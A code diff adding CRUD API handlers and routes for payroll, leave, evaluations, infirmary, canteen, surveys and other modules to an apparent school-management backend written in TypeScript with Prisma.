+async function deleteInventory(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  await prisma.inventory.deleteMany({ where: { id, schoolId: u.schoolId } });
+  return json({ ok: true }, 200, h);
+}
+
+// ─── Payroll ──────────────────────────────────────────────────────────────────
+async function getPayroll(req: Request, h: Headers, url: URL): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const list = await prisma.payroll.findMany({
+    where: { staff: { schoolId: u.schoolId } },
+    include: { staff: { include: { user: { include: { profile: true } } } } },
+    orderBy: [{ year: "desc" }, { month: "desc" }],
+  });
+  return json(list.map((p) => ({
+    id: p.id, staffId: p.staffId, month: p.month, year: p.year,
+    staffName: p.staff.user.profile ? `${p.staff.user.profile.firstName} ${p.staff.user.profile.lastName}`.trim() : p.staff.user.email,
+    designation: p.staff.designation,
+    basicSalary: Number(p.basicSalary), allowances: Number(p.allowances), deductions: Number(p.deductions), netPay: Number(p.netPay),
+    status: p.status, paidAt: p.paidAt,
+  })), 200, h);
+}
+async function createPayroll(req: Request, h: Headers): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.staffId || body?.month === undefined || body?.year === undefined) return err("staffId, month, year required", 400, h);
+  const staff = await prisma.staff.findFirst({ where: { id: body.staffId, schoolId: u.schoolId } });
+  if (!staff) return err("Staff not found", 404, h);
+  const basic = Number(body.basicSalary ?? staff.salary ?? 0);
+  const allowances = Number(body.allowances ?? 0);
+  const deductions = Number(body.deductions ?? 0);
+  try {
+    const p = await prisma.payroll.create({ data: {
+      staffId: body.staffId, month: Number(body.month), year: Number(body.year),
+      basicSalary: basic, allowances, deductions, netPay: basic + allowances - deductions, status: "PENDING",
+    } });
+    return json(p, 201, h);
+  } catch (e: any) {
+    if (e?.code === "P2002") return err("Payroll for this staff/month/year already exists.", 400, h);
+    return err("Failed to create payroll", 400, h);
+  }
+}
+async function updatePayroll(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const existing = await prisma.payroll.findFirst({ where: { id, staff: { schoolId: u.schoolId } } });
+  if (!existing) return err("Not found", 404, h);
+  const body = await req.json().catch(() => null);
+  const data: any = {};
+  if (body.status) { data.status = body.status; if (body.status === "PAID") data.paidAt = new Date(); }
+  if (body.allowances != null || body.deductions != null || body.basicSalary != null) {
+    const basic = Number(body.basicSalary ?? existing.basicSalary);
+    const allowances = Number(body.allowances ?? existing.allowances);
+    const deductions = Number(body.deductions ?? existing.deductions);
+    data.basicSalary = basic; data.allowances = allowances; data.deductions = deductions; data.netPay = basic + allowances - deductions;
+  }
+  const p = await prisma.payroll.update({ where: { id }, data });
+  return json(p, 200, h);
+}
+async function deletePayroll(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  await prisma.payroll.deleteMany({ where: { id, staff: { schoolId: u.schoolId } } });
+  return json({ ok: true }, 200, h);
+}
+
+// ─── Teacher Payroll ──────────────────────────────────────────────────────────
+async function getTeacherPayroll(req: Request, h: Headers, url: URL): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const teacherId = url.searchParams.get("teacherId");
+  const list = await prisma.teacherPayroll.findMany({
+    where: { ...(teacherId ? { teacherId } : {}), teacher: { user: { schoolId: u.schoolId } } },
+    include: { teacher: { include: { user: { include: { profile: true } } } } },
+    orderBy: [{ year: "desc" }, { month: "desc" }],
+  });
+  return json(list.map((p) => {
+    const prof = p.teacher.user.profile;
+    return {
+      id: p.id, teacherId: p.teacherId,
+      teacherName: prof ? `${prof.firstName} ${prof.lastName}`.trim() : p.teacher.user.email,
+      month: p.month, year: p.year,
+      basicSalary: Number(p.basicSalary), allowances: Number(p.allowances), deductions: Number(p.deductions),
+      netPay: Number(p.netPay), status: p.status, paidAt: p.paidAt,
+    };
+  }), 200, h);
+}
+async function createTeacherPayroll(req: Request, h: Headers): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.teacherId || body?.month === undefined || body?.year === undefined) return err("teacherId, month, year required", 400, h);
+  const teacher = await prisma.teacher.findFirst({ where: { id: body.teacherId, user: { schoolId: u.schoolId } } });
+  if (!teacher) return err("Teacher not found", 404, h);
+  const basic = Number(body.basicSalary ?? teacher.salary ?? 0);
+  const allow = Number(body.allowances ?? teacher.allowances ?? 0);
+  const deduct = Number(body.deductions ?? teacher.deductions ?? 0);
+  try {
+    const p = await prisma.teacherPayroll.create({ data: {
+      teacherId: body.teacherId, month: Number(body.month), year: Number(body.year),
+      basicSalary: basic, allowances: allow, deductions: deduct, netPay: basic + allow - deduct,
+    }});
+    return json(p, 201, h);
+  } catch (e: any) {
+    if (e?.code === "P2002") return err("Payroll for this teacher/month/year already exists.", 400, h);
+    return err("Failed to create payroll", 400, h);
+  }
+}
+async function updateTeacherPayroll(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const existing = await prisma.teacherPayroll.findFirst({ where: { id, teacher: { user: { schoolId: u.schoolId } } } });
+  if (!existing) return err("Not found", 404, h);
+  const body = await req.json().catch(() => null);
+  const data: any = {};
+  if (body?.status) data.status = body.status;
+  if (body?.status === "PAID") data.paidAt = new Date();
+  if (body?.basicSalary !== undefined || body?.allowances !== undefined || body?.deductions !== undefined) {
+    const bs = Number(body?.basicSalary ?? existing.basicSalary);
+    const al = Number(body?.allowances ?? existing.allowances);
+    const de = Number(body?.deductions ?? existing.deductions);
+    data.basicSalary = bs; data.allowances = al; data.deductions = de; data.netPay = bs + al - de;
+  }
+  const p = await prisma.teacherPayroll.update({ where: { id }, data });
+  return json(p, 200, h);
+}
+async function deleteTeacherPayroll(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  await prisma.teacherPayroll.deleteMany({ where: { id, teacher: { user: { schoolId: u.schoolId } } } });
+  return json({ ok: true }, 200, h);
+}
+
+// ─── Leave Notes ────────────────────────────────────────────────────────────────
+async function getLeaves(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const list = await prisma.leaveApplication.findMany({ where: { schoolId: u.schoolId }, orderBy: { createdAt: "desc" } });
+  return json(list, 200, h);
+}
+async function createLeave(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.fromDate || !body?.toDate || !body?.reason) return err("fromDate, toDate, reason required", 400, h);
+  const profile = await prisma.userProfile.findUnique({ where: { userId: u.id } });
+  const name = body.applicantName || (profile ? `${profile.firstName} ${profile.lastName}`.trim() : u.email.split("@")[0]);
+  const l = await prisma.leaveApplication.create({ data: {
+    schoolId: u.schoolId, userId: u.id, applicantRole: u.role.toUpperCase() as any, applicantName: name,
+    type: body.type ?? "OTHER", fromDate: new Date(body.fromDate), toDate: new Date(body.toDate), reason: body.reason,
+  } });
+  return json(l, 201, h);
+}
+async function updateLeave(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const existing = await prisma.leaveApplication.findFirst({ where: { id, schoolId: u.schoolId } });
+  if (!existing) return err("Not found", 404, h);
+  const body = await req.json().catch(() => null);
+  const l = await prisma.leaveApplication.update({ where: { id }, data: { status: body.status, reviewNote: body.reviewNote ?? null, reviewedById: u.id } });
+  return json(l, 200, h);
+}
+async function deleteLeave(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  await prisma.leaveApplication.deleteMany({ where: { id, schoolId: u.schoolId } });
+  return json({ ok: true }, 200, h);
+}
+
+// ─── Teacher Evaluation ──────────────────────────────────────────────────────────
+async function getTeacherEvaluations(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const list = await prisma.teacherEvaluation.findMany({
+    where: { schoolId: u.schoolId },
+    include: { teacher: { include: { user: { include: { profile: true } } } } },
+    orderBy: { createdAt: "desc" },
+  });
+  return json(list.map((e) => ({
+    id: e.id, teacherId: e.teacherId, period: e.period,
+    teacherName: e.teacher.user.profile ? `${e.teacher.user.profile.firstName} ${e.teacher.user.profile.lastName}`.trim() : e.teacher.user.email,
+    teachingQuality: e.teachingQuality, punctuality: e.punctuality, studentFeedback: e.studentFeedback, collaboration: e.collaboration,
+    overallScore: e.overallScore, remarks: e.remarks, createdAt: e.createdAt,
+  })), 200, h);
+}
+async function createTeacherEvaluation(req: Request, h: Headers): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.teacherId || !body?.period) return err("teacherId and period required", 400, h);
+  const teacher = await prisma.teacher.findFirst({ where: { id: body.teacherId, user: { schoolId: u.schoolId } } });
+  if (!teacher) return err("Teacher not found", 404, h);
+  const scores = [body.teachingQuality, body.punctuality, body.studentFeedback, body.collaboration].map((x) => Number(x ?? 0));
+  const overall = scores.reduce((a, b) => a + b, 0) / scores.length;
+  const e = await prisma.teacherEvaluation.create({ data: {
+    schoolId: u.schoolId, teacherId: body.teacherId, period: body.period,
+    teachingQuality: scores[0], punctuality: scores[1], studentFeedback: scores[2], collaboration: scores[3],
+    overallScore: Math.round(overall * 10) / 10, remarks: body.remarks || null, evaluatedById: u.id,
+  } });
+  return json(e, 201, h);
+}
+async function deleteTeacherEvaluation(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  await prisma.teacherEvaluation.deleteMany({ where: { id, schoolId: u.schoolId } });
+  return json({ ok: true }, 200, h);
+}
+
+// ─── Student Assessment (CAS) ─────────────────────────────────────────────────────
+async function getStudentAssessments(req: Request, h: Headers, url: URL): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const studentId = url.searchParams.get("studentId");
+  const where: any = { schoolId: u.schoolId };
+  if (studentId) where.studentId = studentId;
+  const list = await prisma.studentAssessment.findMany({
+    where,
+    include: { student: { include: { user: { include: { profile: true } } } } },
+    orderBy: { createdAt: "desc" },
+  });
+  return json(list.map((a) => ({
+    id: a.id, studentId: a.studentId, term: a.term, area: a.area, grade: a.grade, score: a.score, remarks: a.remarks, createdAt: a.createdAt,
+    studentName: a.student.user.profile ? `${a.student.user.profile.firstName} ${a.student.user.profile.lastName}`.trim() : a.student.user.email,
+    admissionNo: a.student.admissionNo,
+  })), 200, h);
+}
+async function createStudentAssessment(req: Request, h: Headers): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.studentId || !body?.term || !body?.area) return err("studentId, term, area required", 400, h);
+  const student = await prisma.student.findFirst({ where: { id: body.studentId, schoolId: u.schoolId } });
+  if (!student) return err("Student not found", 404, h);
+  const a = await prisma.studentAssessment.create({ data: {
+    schoolId: u.schoolId, studentId: body.studentId, term: body.term, area: body.area,
+    grade: body.grade || null, score: body.score != null && body.score !== "" ? Number(body.score) : null, remarks: body.remarks || null, assessedById: u.id,
+  } });
+  return json(a, 201, h);
+}
+async function deleteStudentAssessment(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  await prisma.studentAssessment.deleteMany({ where: { id, schoolId: u.schoolId } });
+  return json({ ok: true }, 200, h);
+}
+
+// ─── Documents ────────────────────────────────────────────────────────────────
+async function getDocuments(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const list = await prisma.document.findMany({ where: { schoolId: u.schoolId }, orderBy: { createdAt: "desc" } });
+  return json(list, 200, h);
+}
+async function createDocument(req: Request, h: Headers): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.title || !body?.fileUrl) return err("title and fileUrl required", 400, h);
+  const d = await prisma.document.create({ data: {
+    schoolId: u.schoolId, title: body.title, category: body.category ?? "General", fileUrl: body.fileUrl,
+    fileType: body.fileType || null, description: body.description || null, uploadedById: u.id,
+  } });
+  return json(d, 201, h);
+}
+async function deleteDocument(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  await prisma.document.deleteMany({ where: { id, schoolId: u.schoolId } });
+  return json({ ok: true }, 200, h);
+}
+
+// ─── Canteen ────────────────────────────────────────────────────────────────────
+async function getCanteenItems(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const list = await prisma.canteenItem.findMany({ where: { schoolId: u.schoolId }, orderBy: { createdAt: "desc" } });
+  return json(list.map((c) => ({ ...c, price: Number(c.price) })), 200, h);
+}
+async function createCanteenItem(req: Request, h: Headers): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.name || body?.price === undefined) return err("name and price required", 400, h);
+  const c = await prisma.canteenItem.create({ data: {
+    schoolId: u.schoolId, name: body.name, category: body.category ?? "Meal", price: Number(body.price),
+    dayOfWeek: body.dayOfWeek != null && body.dayOfWeek !== "" ? Number(body.dayOfWeek) : null, available: body.available ?? true,
+  } });
+  return json(c, 201, h);
+}
+async function updateCanteenItem(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const existing = await prisma.canteenItem.findFirst({ where: { id, schoolId: u.schoolId } });
+  if (!existing) return err("Not found", 404, h);
+  const body = await req.json().catch(() => null);
+  const c = await prisma.canteenItem.update({ where: { id }, data: {
+    name: body.name, category: body.category, price: body.price != null ? Number(body.price) : undefined,
+    dayOfWeek: body.dayOfWeek != null && body.dayOfWeek !== "" ? Number(body.dayOfWeek) : undefined, available: body.available,
+  } });
+  return json({ ...c, price: Number(c.price) }, 200, h);
+}
+async function deleteCanteenItem(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  await prisma.canteenItem.deleteMany({ where: { id, schoolId: u.schoolId } });
+  return json({ ok: true }, 200, h);
+}
+
+// ─── Support Tickets ──────────────────────────────────────────────────────────────
+async function getSupportTickets(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const list = await prisma.supportTicket.findMany({ where: { schoolId: u.schoolId }, orderBy: { createdAt: "desc" } });
+  return json(list, 200, h);
+}
+async function createSupportTicket(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.subject || !body?.message) return err("subject and message required", 400, h);
+  const profile = await prisma.userProfile.findUnique({ where: { userId: u.id } });
+  const t = await prisma.supportTicket.create({ data: {
+    schoolId: u.schoolId, subject: body.subject, message: body.message, category: body.category ?? "General",
+    priority: body.priority ?? "NORMAL", raisedById: u.id,
+    raisedByName: profile ? `${profile.firstName} ${profile.lastName}`.trim() : u.email.split("@")[0],
+  } });
+  return json(t, 201, h);
+}
+async function updateSupportTicket(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const existing = await prisma.supportTicket.findFirst({ where: { id, schoolId: u.schoolId } });
+  if (!existing) return err("Not found", 404, h);
+  const body = await req.json().catch(() => null);
+  const t = await prisma.supportTicket.update({ where: { id }, data: { status: body.status, response: body.response, priority: body.priority } });
+  return json(t, 200, h);
+}
+async function deleteSupportTicket(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  await prisma.supportTicket.deleteMany({ where: { id, schoolId: u.schoolId } });
+  return json({ ok: true }, 200, h);
+}
+
+// ─── Surveys ──────────────────────────────────────────────────────────────────
+async function getSurveys(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const list = await prisma.survey.findMany({ where: { schoolId: u.schoolId }, include: { _count: { select: { responses: true } } }, orderBy: { createdAt: "desc" } });
+  return json(list.map((s) => ({ id: s.id, title: s.title, description: s.description, questions: s.questions, targetRole: s.targetRole, isActive: s.isActive, responseCount: s._count.responses, createdAt: s.createdAt })), 200, h);
+}
+async function createSurvey(req: Request, h: Headers): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.title || !Array.isArray(body?.questions) || body.questions.length === 0) return err("title and at least one question required", 400, h);
+  const s = await prisma.survey.create({ data: {
+    schoolId: u.schoolId, title: body.title, description: body.description || null, questions: body.questions,
+    targetRole: body.targetRole ?? null, isActive: body.isActive ?? true,
+  } });
+  return json(s, 201, h);
+}
+async function updateSurvey(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const existing = await prisma.survey.findFirst({ where: { id, schoolId: u.schoolId } });
+  if (!existing) return err("Not found", 404, h);
+  const body = await req.json().catch(() => null);
+  const s = await prisma.survey.update({ where: { id }, data: { title: body.title, description: body.description, isActive: body.isActive } });
+  return json(s, 200, h);
+}
+async function deleteSurvey(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  await prisma.survey.deleteMany({ where: { id, schoolId: u.schoolId } });
+  return json({ ok: true }, 200, h);
+}
+
+// ─── Infirmary ──────────────────────────────────────────────────────────────────
+async function getInfirmaryVisits(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const list = await prisma.infirmaryVisit.findMany({
+    where: { schoolId: u.schoolId },
+    include: { student: { include: { user: { include: { profile: true } } } } },
+    orderBy: { visitDate: "desc" },
+  });
+  return json(list.map((v) => ({
+    id: v.id, studentId: v.studentId,
+    patientName: v.student ? (v.student.user.profile ? `${v.student.user.profile.firstName} ${v.student.user.profile.lastName}`.trim() : v.student.user.email) : v.visitorName,
+    symptoms: v.symptoms, treatment: v.treatment, temperature: v.temperature, medication: v.medication, visitDate: v.visitDate,
+  })), 200, h);
+}
+async function createInfirmaryVisit(req: Request, h: Headers): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.symptoms) return err("symptoms required", 400, h);
+  if (!body?.studentId && !body?.visitorName) return err("studentId or visitorName required", 400, h);
+  if (body.studentId) {
+    const student = await prisma.student.findFirst({ where: { id: body.studentId, schoolId: u.schoolId } });
+    if (!student) return err("Student not found", 404, h);
+  }
+  const v = await prisma.infirmaryVisit.create({ data: {
+    schoolId: u.schoolId, studentId: body.studentId || null, visitorName: body.visitorName || null,
+    symptoms: body.symptoms, treatment: body.treatment || null, temperature: body.temperature || null, medication: body.medication || null,
+    visitDate: body.visitDate ? new Date(body.visitDate) : new Date(), recordedById: u.id,
+  } });
+  return json(v, 201, h);
+}
+async function deleteInfirmaryVisit(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  await prisma.infirmaryVisit.deleteMany({ where: { id, schoolId: u.schoolId } });
+  return json({ ok: true }, 200, h);
+}
+
+// ─── ECA (Extra-Curricular Activities) ────────────────────────────────────────────
+async function getEcaActivities(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const list = await prisma.ecaActivity.findMany({ where: { schoolId: u.schoolId }, orderBy: { createdAt: "desc" } });
+  return json(list, 200, h);
+}
+async function createEcaActivity(req: Request, h: Headers): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.name) return err("name required", 400, h);
+  const e = await prisma.ecaActivity.create({ data: {
+    schoolId: u.schoolId, name: body.name, category: body.category ?? "Sports", description: body.description || null,
+    inchargeName: body.inchargeName || null, schedule: body.schedule || null,
+  } });
+  return json(e, 201, h);
+}
+async function updateEcaActivity(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const existing = await prisma.ecaActivity.findFirst({ where: { id, schoolId: u.schoolId } });
+  if (!existing) return err("Not found", 404, h);
+  const body = await req.json().catch(() => null);
+  const e = await prisma.ecaActivity.update({ where: { id }, data: { name: body.name, category: body.category, description: body.description, inchargeName: body.inchargeName, schedule: body.schedule } });
+  return json(e, 200, h);
+}
+async function deleteEcaActivity(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  await prisma.ecaActivity.deleteMany({ where: { id, schoolId: u.schoolId } });
+  return json({ ok: true }, 200, h);
 }
 
 // ─── Router ───────────────────────────────────────────────────────────────────
@@ -3175,6 +4325,11 @@ Bun.serve({
 
     // Health
     if (p === "/health") return json({ ok: true, ts: new Date().toISOString() }, 200, h);
+
+    // Public school directory (no auth) — for "Find your school" + branded login
+    if (p === "/api/public/schools" && req.method === "GET") return getPublicSchools(req, h, url);
+    const publicSchoolMatch = p.match(/^\/api\/public\/schools\/([^/]+)$/);
+    if (publicSchoolMatch && req.method === "GET") return getPublicSchool(req, h, publicSchoolMatch[1]);
 
     // Auth
     if (p === "/api/auth/super-admin/login" && req.method === "POST") return loginSuperAdmin(req, h);
@@ -3405,6 +4560,17 @@ Bun.serve({
       if (req.method === "POST") return createFeeType(req, h);
     }
 
+    // Fee Structures / Installment plans
+    if (p === "/api/admin/fee-structures") {
+      if (req.method === "GET") return getFeeStructures(req, h, url);
+      if (req.method === "POST") return createFeeStructure(req, h);
+    }
+    const feeStructMatch = p.match(/^\/api\/admin\/fee-structures\/([^/]+)$/);
+    if (feeStructMatch) {
+      if (req.method === "PATCH") return updateFeeStructure(req, h, feeStructMatch[1]);
+      if (req.method === "DELETE") return deleteFeeStructure(req, h, feeStructMatch[1]);
+    }
+
     // Notices
     if (p === "/api/admin/notices") {
       if (req.method === "GET") return getNotices(req, h);
@@ -3422,6 +4588,7 @@ Bun.serve({
     if (examMatch) {
       if (req.method === "GET") return getExamSchedule(req, h, examMatch[1]);
       if (req.method === "PATCH") return updateExam(req, h, examMatch[1]);
+      if (req.method === "DELETE") return deleteExam(req, h, examMatch[1]);
     }
     const examSubjectMatch = p.match(/^\/api\/admin\/exams\/([^/]+)\/subjects$/);
     if (examSubjectMatch && req.method === "POST") return upsertExamSubject(req, h, examSubjectMatch[1]);
@@ -3458,6 +4625,8 @@ Bun.serve({
     }
     const admissionEnrollMatch = p.match(/^\/api\/admin\/admissions\/([^/]+)\/enroll$/);
     if (admissionEnrollMatch && req.method === "POST") return enrollAdmission(req, h, admissionEnrollMatch[1]);
+    const admissionFeeMatch = p.match(/^\/api\/admin\/admissions\/([^/]+)\/fee-payment$/);
+    if (admissionFeeMatch && req.method === "PATCH") return markAdmissionFee(req, h, admissionFeeMatch[1]);
     const admissionMatch = p.match(/^\/api\/admin\/admissions\/([^/]+)$/);
     if (admissionMatch) {
       if (req.method === "PATCH") return updateAdmission(req, h, admissionMatch[1]);
@@ -3468,6 +4637,166 @@ Bun.serve({
     if (p === "/api/admin/settings") {
       if (req.method === "GET") return getSchoolSettings(req, h);
       if (req.method === "PATCH") return updateSchoolSettings(req, h);
+    }
+
+    // ── Enterprise Feature Modules ────────────────────────────────────────────
+    // Notifications
+    if (p === "/api/admin/notifications") {
+      if (req.method === "GET") return getNotifications(req, h);
+      if (req.method === "POST") return createNotification(req, h);
+    }
+    const notifMatch = p.match(/^\/api\/admin\/notifications\/([^/]+)$/);
+    if (notifMatch && req.method === "DELETE") return deleteNotification(req, h, notifMatch[1]);
+
+    // User Management
+    if (p === "/api/admin/users" && req.method === "GET") return listSchoolUsers(req, h);
+    const userIdMatch = p.match(/^\/api\/admin\/users\/([^/]+)$/);
+    if (userIdMatch) {
+      if (req.method === "GET") return getSchoolUser(req, h, userIdMatch[1]);
+      if (req.method === "PATCH") return updateSchoolUser(req, h, userIdMatch[1]);
+    }
+    const setPassMatch = p.match(/^\/api\/admin\/users\/([^/]+)\/set-password$/);
+    if (setPassMatch && req.method === "POST") return setUserPassword(req, h, setPassMatch[1]);
+
+    // Routine (Timetable)
+    if (p === "/api/admin/routine") {
+      if (req.method === "GET") return getRoutine(req, h);
+      if (req.method === "POST") return createRoutineSlot(req, h);
+    }
+    const routineMatch = p.match(/^\/api\/admin\/routine\/([^/]+)$/);
+    if (routineMatch && req.method === "DELETE") return deleteRoutineSlot(req, h, routineMatch[1]);
+
+    // Homework
+    if (p === "/api/admin/homework") {
+      if (req.method === "GET") return getHomework(req, h);
+      if (req.method === "POST") return createHomework(req, h);
+    }
+    const homeworkMatch = p.match(/^\/api\/admin\/homework\/([^/]+)$/);
+    if (homeworkMatch && req.method === "DELETE") return deleteHomework(req, h, homeworkMatch[1]);
+
+    // Chat
+    if (p === "/api/admin/chat/users") return getSchoolUsers(req, h);
+    if (p === "/api/admin/chat/messages") {
+      if (req.method === "GET") return getMessages(req, h, url);
+      if (req.method === "POST") return sendMessage(req, h);
+    }
+
+    // Inventory
+    if (p === "/api/admin/inventory") {
+      if (req.method === "GET") return getInventory(req, h);
+      if (req.method === "POST") return createInventory(req, h);
+    }
+    const inventoryMatch = p.match(/^\/api\/admin\/inventory\/([^/]+)$/);
+    if (inventoryMatch) {
+      if (req.method === "PATCH") return updateInventory(req, h, inventoryMatch[1]);
+      if (req.method === "DELETE") return deleteInventory(req, h, inventoryMatch[1]);
+    }
+
+    // Payroll
+    if (p === "/api/admin/payroll") {
+      if (req.method === "GET") return getPayroll(req, h, url);
+      if (req.method === "POST") return createPayroll(req, h);
+    }
+    const payrollMatch = p.match(/^\/api\/admin\/payroll\/([^/]+)$/);
+    if (payrollMatch) {
+      if (req.method === "PATCH") return updatePayroll(req, h, payrollMatch[1]);
+      if (req.method === "DELETE") return deletePayroll(req, h, payrollMatch[1]);
+    }
+    if (p === "/api/admin/teacher-payroll") {
+      if (req.method === "GET") return getTeacherPayroll(req, h, url);
+      if (req.method === "POST") return createTeacherPayroll(req, h);
+    }
+    const teacherPayrollMatch = p.match(/^\/api\/admin\/teacher-payroll\/([^/]+)$/);
+    if (teacherPayrollMatch) {
+      if (req.method === "PATCH") return updateTeacherPayroll(req, h, teacherPayrollMatch[1]);
+      if (req.method === "DELETE") return deleteTeacherPayroll(req, h, teacherPayrollMatch[1]);
+    }
+
+    // Leave Notes
+    if (p === "/api/admin/leaves") {
+      if (req.method === "GET") return getLeaves(req, h);
+      if (req.method === "POST") return createLeave(req, h);
+    }
+    const leaveMatch = p.match(/^\/api\/admin\/leaves\/([^/]+)$/);
+    if (leaveMatch) {
+      if (req.method === "PATCH") return updateLeave(req, h, leaveMatch[1]);
+      if (req.method === "DELETE") return deleteLeave(req, h, leaveMatch[1]);
+    }
+
+    // Teacher Evaluation
+    if (p === "/api/admin/teacher-evaluations") {
+      if (req.method === "GET") return getTeacherEvaluations(req, h);
+      if (req.method === "POST") return createTeacherEvaluation(req, h);
+    }
+    const teacherEvalMatch = p.match(/^\/api\/admin\/teacher-evaluations\/([^/]+)$/);
+    if (teacherEvalMatch && req.method === "DELETE") return deleteTeacherEvaluation(req, h, teacherEvalMatch[1]);
+
+    // Student Assessment (CAS)
+    if (p === "/api/admin/assessments") {
+      if (req.method === "GET") return getStudentAssessments(req, h, url);
+      if (req.method === "POST") return createStudentAssessment(req, h);
+    }
+    const assessmentMatch = p.match(/^\/api\/admin\/assessments\/([^/]+)$/);
+    if (assessmentMatch && req.method === "DELETE") return deleteStudentAssessment(req, h, assessmentMatch[1]);
+
+    // Documents
+    if (p === "/api/admin/documents") {
+      if (req.method === "GET") return getDocuments(req, h);
+      if (req.method === "POST") return createDocument(req, h);
+    }
+    const documentMatch = p.match(/^\/api\/admin\/documents\/([^/]+)$/);
+    if (documentMatch && req.method === "DELETE") return deleteDocument(req, h, documentMatch[1]);
+
+    // Canteen
+    if (p === "/api/admin/canteen") {
+      if (req.method === "GET") return getCanteenItems(req, h);
+      if (req.method === "POST") return createCanteenItem(req, h);
+    }
+    const canteenMatch = p.match(/^\/api\/admin\/canteen\/([^/]+)$/);
+    if (canteenMatch) {
+      if (req.method === "PATCH") return updateCanteenItem(req, h, canteenMatch[1]);
+      if (req.method === "DELETE") return deleteCanteenItem(req, h, canteenMatch[1]);
+    }
+
+    // Support Tickets
+    if (p === "/api/admin/support") {
+      if (req.method === "GET") return getSupportTickets(req, h);
+      if (req.method === "POST") return createSupportTicket(req, h);
+    }
+    const supportMatch = p.match(/^\/api\/admin\/support\/([^/]+)$/);
+    if (supportMatch) {
+      if (req.method === "PATCH") return updateSupportTicket(req, h, supportMatch[1]);
+      if (req.method === "DELETE") return deleteSupportTicket(req, h, supportMatch[1]);
+    }
+
+    // Surveys
+    if (p === "/api/admin/surveys") {
+      if (req.method === "GET") return getSurveys(req, h);
+      if (req.method === "POST") return createSurvey(req, h);
+    }
